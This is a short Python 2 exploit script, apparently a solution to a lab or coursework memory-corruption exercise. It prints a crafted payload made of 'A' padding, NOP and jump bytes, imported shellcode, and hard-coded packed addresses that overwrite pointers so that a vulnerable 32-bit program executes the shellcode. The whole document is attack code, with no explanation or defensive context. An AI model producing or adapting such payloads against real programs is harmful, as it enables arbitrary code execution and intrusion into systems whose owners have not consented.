from struct import pack
from shellcode import shellcode

address = 0xbffeed2c

print "A" * 40 + "\x90\x90\xeb\x04"

print shellcode + "A" * (40 - len(shellcode)) + pack("<I", 0x080f3748) + pack("<I", address)

print "A"




